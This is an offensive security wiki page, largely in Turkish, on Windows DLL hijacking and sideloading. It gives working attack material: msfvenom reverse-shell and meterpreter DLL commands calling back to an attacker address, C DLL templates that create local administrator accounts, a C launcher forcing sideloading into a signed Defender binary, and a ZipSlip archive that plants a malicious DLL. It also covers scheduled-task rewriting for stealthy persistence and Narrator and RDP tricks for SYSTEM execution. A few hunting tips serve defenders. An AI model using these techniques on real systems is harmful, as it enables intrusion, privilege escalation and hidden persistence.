# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Basic Information

DLL Hijacking, güvenilir bir uygulamayı kötü amaçlı bir DLL yükleyecek şekilde manipüle etmeyi içerir. Bu terim, **DLL Spoofing, Injection ve Side-Loading** gibi çeşitli taktikleri kapsar. Başlıca code execution, persistence ve daha az sıklıkla privilege escalation için kullanılır. Burada escalation'a odaklanılsa da hijack yöntemi hedeflerden bağımsız olarak aynıdır.

### Common Techniques

DLL hijacking için birkaç yöntem kullanılır ve her birinin etkinliği, uygulamanın DLL yükleme stratejisine bağlıdır:

1. **DLL Replacement**: Orijinal bir DLL'yi kötü amaçlı bir DLL ile değiştirmek; isteğe bağlı olarak orijinal DLL'nin işlevselliğini korumak için DLL Proxying kullanılır.
2. **DLL Search Order Hijacking**: Kötü amaçlı DLL'yi, meşru DLL'den önce gelen bir search path içine yerleştirmek ve uygulamanın arama düzenini istismar etmek.
3. **Phantom DLL Hijacking**: Bir uygulamanın yüklemesi için, var olmayan gerekli bir DLL sanılması amacıyla kötü amaçlı bir DLL oluşturmak.
4. **DLL Redirection**: Uygulamayı kötü amaçlı DLL'ye yönlendirmek için `%PATH%` veya `.exe.manifest` / `.exe.local` dosyaları gibi search parametrelerini değiştirmek.
5. **WinSxS DLL Replacement**: Meşru DLL'yi WinSxS dizininde bulunan kötü amaçlı bir karşılığıyla değiştirmek; bu yöntem çoğu zaman DLL side-loading ile ilişkilidir.
6. **Relative Path DLL Hijacking**: Kötü amaçlı DLL'yi, kopyalanmış uygulama ile birlikte kullanıcı kontrolündeki bir dizine yerleştirmek; Binary Proxy Execution tekniklerine benzer.


### AppDomainManager hijacking (`<exe>.config` + attacker assembly)

Klasik DLL sideloading, güvenilir bir **.NET Framework** sürecinin attacker code yüklemesini sağlamanın tek yolu değildir. Hedef executable bir **managed** uygulama ise, CLR ayrıca executable ile aynı adı taşıyan bir **application configuration file** dosyasına da bakar (örneğin `Setup.exe.config`). Bu dosya özel bir **AppDomainManager** tanımlayabilir. Config, EXE'nin yanına yerleştirilmiş ve attacker tarafından kontrol edilen bir assembly'yi işaret ederse, CLR onu **uygulamanın normal code path'inden önce** yükler ve güvenilir süreç içinde çalıştırır.

Microsoft'un .NET Framework configuration schema'sına göre, özel manager'ın kullanılabilmesi için hem `<appDomainManagerAssembly>` hem de `<appDomainManagerType>` mevcut olmalıdır.

Minimal config:
```xml
<configuration>
<runtime>
<appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
<appDomainManagerType value="EvilMgr.Loader" />
</runtime>
</configuration>
```
Minimal yönetici:
```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
[DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
}
}
```
Pratik notlar:
- Bu, **.NET Framework’e özgü** bir tekniktir. Win32 DLL search order’a değil, CLR config parsing’e bağlıdır.
- Host gerçekten bir **managed EXE** olmalıdır. Hızlı kontrol: `sigcheck -m target.exe`, `corflags target.exe`, veya PE metadata içinde **CLR Runtime Header** olup olmadığına bakın.
- Config dosya adı executable adıyla birebir eşleşmelidir (`<binary>.config`) ve genellikle **EXE’nin yanında** bulunur.
- Bu, **signed Microsoft/vendor binaries** ile kullanışlıdır çünkü trusted EXE değişmeden kalır, malicious managed assembly ise in-process çalışır.
- Eğer zaten writable bir installer/update directory’niz varsa, AppDomainManager hijacking **ilk stage** olarak kullanılabilir; ardından sonraki aşamalar için klasik DLL sideloading veya reflective loading yapılabilir.

### Mevcut bir scheduled task’i hijack ederek sideload zincirini yeniden başlatmak

Persistence için sadece **yeni bir task oluşturmayı** aramayın. Bazı intrusion setler, meşru bir installer’ın bir **normal updater task** oluşturmasını bekler ve sonra **task action’ını yeniden yazar**; böylece mevcut name, author ve trigger defender’lara tanıdık görünmeye devam eder.

Yeniden kullanılabilir workflow:
1. Meşru software’i install/run edin ve normalde oluşturduğu task’i belirleyin.
2. Task XML’ini export edin ve mevcut `<Exec><Command>` / `<Arguments>` değerlerini not edin.
3. Sadece action’ı değiştirin; böylece task, user-writable bir staging directory içindeki **trusted host EXE**’nizi başlatır ve bu EXE gerçek payload’ı side-load eder veya AppDomain-load eder.
4. Yeni ve bariz bir persistence artifact’i oluşturmak yerine aynı task adını yeniden register edin.
```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```
Neden daha stealthy olduğu:
- Task adı hâlâ meşru görünebilir (örneğin bir vendor updater).
- **Task Scheduler service** bunu başlatır, bu yüzden parent/ancestor validation çoğu zaman `explorer.exe` yerine beklenen scheduling chain’i görür.
- Sadece **yeni task adlarını** avlayan DFIR ekipleri, registration’ı zaten var olan ama action’ı artık `%LOCALAPPDATA%`, `%APPDATA%` ya da başka attacker-controlled bir path’e işaret eden bir task’i kaçırabilir.

Hızlı hunting pivotları:
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- `C:\Windows\System32\Tasks\*` XML ve `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` metadata değerlerini bir baseline ile karşılaştır.
- Bir **vendor-looking updater task** **user-writable directories** içinden çalışıyorsa veya yanında bulunan `*.config` dosyasıyla bir .NET EXE başlatıyorsa alarm üret.

> [!TIP]
> HTML staging, AES-CTR configs ve .NET implants’i DLL sideloading üzerine katmanlayan adım adım bir chain için aşağıdaki workflow’u inceleyin.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Missing Dlls bulma

Bir sistem içinde missing Dlls bulmanın en yaygın yolu, sysinternals’tan [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) çalıştırmak ve **aşağıdaki 2 filter’ı** **ayarlamaktır**:

![Common Techniques - Finding missing Dlls: The most common way to find missing Dlls inside a system is running procmon from sysinternals, setting the following 2 filters](<../../../images/image (961).png>)

![Common Techniques - Finding missing Dlls: The most common way to find missing Dlls inside a system is running procmon from sysinternals, setting the following 2 filters](<../../../images/image (230).png>)

ve sadece **File System Activity**’yi göstermektir:

![Common Techniques - Finding missing Dlls: and just show the File System Activity](<../../../images/image (153).png>)

Eğer genel olarak **missing dlls** arıyorsan bunu birkaç **second** boyunca çalışır halde bırak.\
Eğer belirli bir executable içindeki **missing dll**’i arıyorsan **"Process Name" "contains" `<exec name>`** gibi başka bir filter ayarlamalı, çalıştırmalı ve event capture’ı durdurmalısın.

## Missing Dlls Exploiting

Privilege escalate etmek için en iyi şansımız, bir privilege process’in yüklemeye çalışacağı bir **dll yazabilmek** ve bunun **aranacağı bir konumda** bulunmasını sağlamaktır. Bu yüzden, bir **folder** içinde, **dll’nin önce** aranacağı bir yere dll yazabileceğiz; yani **original dll**’nin bulunduğu folder’dan önce taranan bir konuma (nadir durum), ya da dll’nin aranacağı bir folder’a yazabilecek fakat original **dll**’nin hiçbir folder’da bulunmadığı bir duruma sahip olacağız.

### Dll Search Order

**Inside the** [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **you can find how the Dlls are loaded specifically.**

**Windows applications** DLL’leri, belirli bir sırayı izleyen önceden tanımlı bir arama yolu setine göre arar. DLL hijacking sorunu, zararlı bir DLL bu dizinlerden birine stratejik olarak yerleştirildiğinde ortaya çıkar ve authentic DLL’den önce yüklenmesini sağlar. Bunu önlemenin çözümü, uygulamanın ihtiyaç duyduğu DLL’lere referans verirken absolute path kullanmasıdır.

32-bit sistemlerdeki **DLL search order** aşağıda görülebilir:

1. Uygulamanın yüklendiği directory.
2. System directory. Bu directory’nin path’ini almak için [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function’ını kullanın.(_C:\Windows\System32_)
3. 16-bit system directory. Bu directory’nin path’ini alan bir function yoktur, ama aranır. (_C:\Windows\System_)
4. Windows directory. Bu directory’nin path’ini almak için [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function’ını kullanın.
1. (_C:\Windows_)
5. Current directory.
6. PATH environment variable içinde listelenen directories. Bunun, **App Paths** registry key ile belirtilen per-application path’i içermediğine dikkat edin. **App Paths** key’i DLL search path hesaplanırken kullanılmaz.

Bu, **SafeDllSearchMode** etkin olduğunda varsayılan search order’dır. Devre dışıyken current directory ikinci sıraya yükselir. Bu özelliği devre dışı bırakmak için **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** registry value’sunu oluşturun ve 0 olarak ayarlayın (default etkin).

Eğer [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) function’ı **LOAD_WITH_ALTERED_SEARCH_PATH** ile çağrılırsa, search işlemi **LoadLibraryEx**’in yüklediği executable module’ün directory’sinde başlar.

Son olarak, **bir dll’nin sadece adı yerine absolute path verilerek de yüklenebileceğini** unutmayın. Bu durumda o dll **yalnızca o path içinde aranır** (dll’nin dependency’leri varsa, onlar da isimleriyle yeni yüklenmiş gibi aranır).

Search order’ı değiştirmek için başka yollar da vardır ama burada onları açıklamayacağım.

### Arbitrary file write’ı missing-DLL hijack’e zincirlemek

1. DLL adlarını toplamak için **ProcMon** filter’larını kullanın (`Process Name` = target EXE, `Path` `.dll` ile bitiyor, `Result` = `NAME NOT FOUND`). Process’in denediği ama bulamadığı DLL adlarını toplayın.
2. Binary bir **schedule/service** üzerinde çalışıyorsa, bu adlardan biriyle bir DLL’i **application directory** içine bırakmak (search-order entry #1), bir sonraki çalıştırmada bunun yüklenmesini sağlar. Bir .NET scanner case’inde process, gerçek kopyayı `C:\Program Files\dotnet\fxr\...` içinden yüklemeden önce `hostfxr.dll` dosyasını `C:\samples\app\` içinde arıyordu.
3. Herhangi bir export içeren bir payload DLL oluşturun (örneğin reverse shell): `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. Primitive’iniz bir **ZipSlip-style arbitrary write** ise, extraction dir’den taşan bir ZIP entry’si hazırlayın; böylece DLL app folder’a düşsün:
```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```
5. Arşivi watched inbox/share içine teslim et; scheduled task işlemi yeniden başlattığında malicious DLL’i yükler ve code’unu service account olarak çalıştırır.

### RTL_USER_PROCESS_PARAMETERS.DllPath ile sideloading zorlamak

Yeni oluşturulan bir process’in DLL search path’ini deterministik olarak etkilemenin gelişmiş bir yolu, ntdll’in native APIs’leriyle process oluştururken RTL_USER_PROCESS_PARAMETERS içindeki DllPath alanını ayarlamaktır. Buraya attacker-controlled bir directory vererek, imported DLL’i ismiyle çözen bir target process’i (absolute path kullanmayan ve safe loading flags kullanmayan) o directory içinden malicious DLL yüklemeye zorlayabilirsin.

Key idea
- Process parameters’ı RtlCreateProcessParametersEx ile oluştur ve controlled folder’ını işaret eden özel bir DllPath sağla (ör. dropper/unpacker’ın bulunduğu directory).
- Process’i RtlCreateUserProcess ile oluştur. Target binary bir DLL’i ismiyle çözdüğünde, loader resolution sırasında bu sağlanan DllPath’i kontrol eder; böylece malicious DLL target EXE ile aynı yerde olmasa bile reliable sideloading mümkün olur.

Notes/limitations
- Bu, oluşturulan child process’i etkiler; current process’i yalnızca etkileyen SetDllDirectory’den farklıdır.
- Target, bir DLL’i ismiyle import etmeli veya LoadLibrary ile yüklemelidir (absolute path olmamalı ve LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories kullanmamalıdır).
- KnownDLLs ve hardcoded absolute paths hijack edilemez. Forwarded exports ve SxS precedence’i değiştirebilir.

Minimal C example (ntdll, wide strings, simplified error handling):

<details>
<summary>Full C example: forcing DLL sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Operasyonel kullanım örneği
- DllPath dizininize kötü amaçlı bir xmllite.dll yerleştirin (gerekli fonksiyonları export ederek veya gerçek olana proxy yaparak).
- Yukarıdaki tekniği kullanarak xmllite.dll dosyasını adına göre aradığı bilinen imzalı bir binary başlatın. loader, verilen DllPath üzerinden import’u çözer ve DLL’inizi side-load eder.

Bu tekniğin, çok aşamalı sideloading zincirlerini yürütmek için gerçek dünyada kullanıldığı görülmüştür: ilk bir launcher, bir helper DLL düşürür; ardından bu DLL, saldırganın DLL’ini bir staging dizininden zorla yükletmek için özel bir DllPath ile Microsoft-signed, hijack edilebilir bir binary başlatır.


#### Windows docs üzerindeki dll search order istisnaları

Windows dokümantasyonunda standart DLL search order için bazı istisnalar belirtilir:

- Zaten memory içinde yüklenmiş olanlarla aynı ada sahip bir **DLL** ile karşılaşıldığında, sistem normal aramayı atlar. Bunun yerine, varsayılan olarak memory içindeki DLL'e dönmeden önce redirection ve manifest kontrolü yapar. **Bu senaryoda sistem DLL için arama yapmaz**.
- DLL, mevcut Windows sürümü için bir **known DLL** olarak tanınırsa, sistem onun known DLL sürümünü ve bağlı olduğu DLL'leri kullanır, **arama sürecini yürütmez**. **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** registry key'i bu known DLL'lerin listesini tutar.
- Bir **DLL'in dependency'leri** varsa, bu dependent DLL'lerin araması, ilk DLL tam path ile tespit edilmiş olsa bile, sanki yalnızca **module names** ile belirtilmişler gibi yapılır.

### Privilege'leri Yükseltme

**Gereksinimler**:

- **Farklı privilege'ler** altında çalışan veya çalışacak bir process belirleyin (horizontal veya lateral movement), ancak bu process'te **eksik bir DLL** olsun.
- **DLL**'in **aranacağı** herhangi bir **directory** için **write access** olduğundan emin olun. Bu konum executable'ın dizini veya system path içindeki bir dizin olabilir.

Evet, bu gereksinimleri bulmak zor, çünkü **varsayılan olarak privileged bir executable içinde eksik bir dll bulmak biraz garip** ve ayrıca **system path içindeki bir klasörde write permission'a sahip olmak daha da garip** (varsayılan olarak olamazsınız). Ancak yanlış yapılandırılmış ortamlarda bu mümkündür.\
Şanslıysanız ve bu gereksinimleri sağlıyorsanız, [UACME](https://github.com/hfiref0x/UACME) projesine bakabilirsiniz. Projenin **ana amacı UAC bypass etmek** olsa da, Windows sürümü için kullanabileceğiniz bir **Dll hijaking PoC** bulabilirsiniz (muhtemelen yalnızca write permission'a sahip olduğunuz klasörün path'ini değiştirerek).

Bir klasördeki **permission'larınızı kontrol edebileceğinizi** not edin:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
Ve **PATH** içindeki tüm klasörlerin izinlerini **kontrol et**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Ayrıca bir executable'ın imports'unu ve bir dll'nin exports'unu şu şekilde kontrol edebilirsiniz:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
For a full guide on how to **abuse Dll Hijacking to escalate privileges** with permissions to write in a **System Path folder** check:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Automated tools

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)System PATH içindeki herhangi bir klasöre yazma izniniz olup olmadığını kontrol eder.\
Bu zafiyeti tespit etmek için diğer ilginç otomated tools **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ ve _Write-HijackDll._

### Example

Kullanılabilir bir senaryo bulmanız durumunda, bunu başarılı şekilde exploit etmek için en önemli şeylerden biri, **executable'ın ondan import edeceği en az tüm function'ları export eden bir dll oluşturmak** olacaktır. Her ne kadar, Dll Hijacking, [**Medium Integrity level'dan High'a **(bypassing UAC)** yükselmek](../../authentication-credentials-uac-and-efs/index.html#uac) veya [**High Integrity'den SYSTEM'e](../index.html#from-high-integrity-to-system)** yükselmek için kullanışlıdır. **Geçerli bir dll'nin nasıl oluşturulacağına** dair bir örneği, execution odaklı bu dll hijacking çalışmasında bulabilirsiniz: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Ayrıca, **bir sonraki bölümde**, **şablon** olarak veya **gerekli olmayan function'ları export edilmiş bir dll oluşturmak** için faydalı olabilecek bazı **temel dll kodları** bulabilirsiniz.

## **Creating and compiling Dlls**

### **Dll Proxifying**

Temelde bir **Dll proxy**, yüklenildiğinde kötü amaçlı kodunuzu **execute** edebilen, ancak aynı zamanda tüm çağrıları gerçek kütüphaneye yönlendirerek **beklendiği gibi expose** ve **work** edebilen bir Dll'dir.

[**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) veya [**Spartacus**](https://github.com/Accenture/Spartacus) aracıyla, gerçekten bir executable belirtip proxify etmek istediğiniz library'yi seçebilir ve **proxified dll** oluşturabilirsiniz ya da **Dll'yi belirtip** **proxified dll** oluşturabilirsiniz.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Bir meterpreter (x86) elde edin:**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Bir kullanıcı oluşturun (x86, x64 sürümünü görmedim):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Kendi

Bazı durumlarda derlediğiniz Dll, kurban süreç tarafından yüklenecek **birkaç fonksiyonu export etmelidir**; bu fonksiyonlar mevcut değilse **binary onları yükleyemez** ve **exploit başarısız olur**.

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>Kullanıcı oluşturma ile C++ DLL örneği</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>Thread girişi olan alternatif C DLL</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Case Study: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe, başlangıçta tahmin edilebilir, dile özgü bir localization DLL aramaya devam eder; bu DLL, arbitrary code execution ve persistence için hijack edilebilir.

Key facts
- Probe path (current builds): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Legacy path (older builds): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- Eğer OneCore path üzerinde yazılabilir, attacker-controlled bir DLL varsa, yüklenir ve `DllMain(DLL_PROCESS_ATTACH)` çalışır. Herhangi bir export gerekmez.

Discovery with Procmon
- Filter: `Process Name is Narrator.exe` and `Operation is Load Image` or `CreateFile`.
- Start Narrator and observe the attempted load of the above path.

Minimal DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
- OPSEC silence
- Naive bir hijack UI'yi konuşur/vurgular. Sessiz kalmak için, attach sırasında Narrator thread'lerini enumerate et, ana thread'i (`OpenThread(THREAD_SUSPEND_RESUME)`) aç ve `SuspendThread` ile duraklat; kendi thread'inde devam et. Tam kod için PoC'ye bak.

- Accessibility configuration üzerinden trigger ve persistence
- User context (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Yukarıdakilerle, Narrator başlatıldığında planted DLL yüklenir. Secure desktop'ta (logon screen), Narrator'ı başlatmak için CTRL+WIN+ENTER'a bas; DLL'in secure desktop üzerinde SYSTEM olarak çalışır.

- RDP-triggered SYSTEM execution (lateral movement)
- Klasik RDP security layer'a izin ver: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Hosta RDP ile bağlan, logon screen'de Narrator'ı başlatmak için CTRL+WIN+ENTER'a bas; DLL'in secure desktop üzerinde SYSTEM olarak çalışır.
- RDP session kapanınca execution durur—hemen inject/migrate et.

- Bring Your Own Accessibility (BYOA)
- Dahili bir Accessibility Tool (AT) registry entry'sini klonlayabilirsin (ör. CursorIndicator), bunu keyfi bir binary/DLL'yi gösterecek şekilde düzenleyip import et, sonra `configuration` değerini o AT adıyla ayarla. Bu, Accessibility framework altında keyfi execution'ı proxy eder.

- Notes
- `%windir%\System32` altına yazmak ve HKLM değerlerini değiştirmek admin rights gerektirir.
- Tüm payload logic `DLL_PROCESS_ATTACH` içinde yaşayabilir; export'lara gerek yoktur.

## Case Study: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

Bu case, Lenovo'nun TrackPoint Quick Menu (`TPQMAssistant.exe`) içinde **Phantom DLL Hijacking** gösterir; **CVE-2025-1729** olarak takip edilir.

### Vulnerability Details

- **Component**: `TPQMAssistant.exe` konumu `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` her gün saat 9:30'da logged-on user context'inde çalışır.
- **Directory Permissions**: `CREATOR OWNER` tarafından writable, yerel kullanıcıların keyfi dosya bırakmasına izin verir.
- **DLL Search Behavior**: Önce çalışma dizininden `hostfxr.dll` yüklemeyi dener ve eksikse "NAME NOT FOUND" loglar; bu da local directory search precedence olduğunu gösterir.

### Exploit Implementation

Bir attacker, aynı dizine malicious bir `hostfxr.dll` stub yerleştirerek eksik DLL'i exploit edebilir ve kullanıcının context'inde code execution elde edebilir:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Attack Flow

1. Standard bir kullanıcı olarak `hostfxr.dll` dosyasını `C:\ProgramData\Lenovo\TPQM\Assistant\` içine bırak.
2. Scheduled task’in mevcut kullanıcının context’i altında saat 9:30 AM’de çalışmasını bekle.
3. Task çalıştığında bir administrator oturum açmışsa, malicious DLL administrator’ın session’ında medium integrity ile çalışır.
4. Standard UAC bypass tekniklerini zincirleyerek medium integrity’den SYSTEM privileges seviyesine yüksel.

## Case Study: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

Threat actors sık sık MSI-based droppers ile DLL side-loading’i birleştirerek payload’ları trusted, signed bir process altında çalıştırır.

Chain overview
- Kullanıcı MSI indirir. GUI install sırasında bir CustomAction sessizce çalışır (ör. LaunchApplication veya bir VBScript action), embedded resources içinden bir sonraki stage’i yeniden oluşturur.
- Dropper, aynı directory içine legitimate, signed bir EXE ve malicious bir DLL yazar (örnek çift: Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll).
- Signed EXE başlatıldığında, Windows DLL search order working directory’den önce wsc.dll’i yükler ve attacker code’u signed parent altında çalıştırır (ATT&CK T1574.001).

MSI analysis (what to look for)
- CustomAction table:
- Executable veya VBScript çalıştıran girdileri ara. Şüpheli örnek pattern: LaunchApplication’in arka planda embedded bir file çalıştırması.
- Orca (Microsoft Orca.exe) içinde CustomAction, InstallExecuteSequence ve Binary tables’ı incele.
- MSI CAB içindeki embedded/split payload’lar:
- Administrative extract: `msiexec /a package.msi /qb TARGETDIR=C:\out`
- Ya da `lessmsi` kullan: `lessmsi x package.msi C:\out`
- VBScript CustomAction tarafından birleştirilip decrypt edilen birden fazla küçük fragment ara. Common flow:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Practical sideloading with wsc_proxy.exe
- Bu iki dosyayı aynı klasöre bırak:
- wsc_proxy.exe: meşru imzalı host (Avast). Process, kendi dizininden adına göre wsc.dll yüklemeye çalışır.
- wsc.dll: attacker DLL. Belirli exports gerekmezse, DllMain yeterli olabilir; aksi halde, bir proxy DLL oluştur ve gerekli exports’ları gerçek library’ye forward ederken payload’ı DllMain içinde çalıştır.
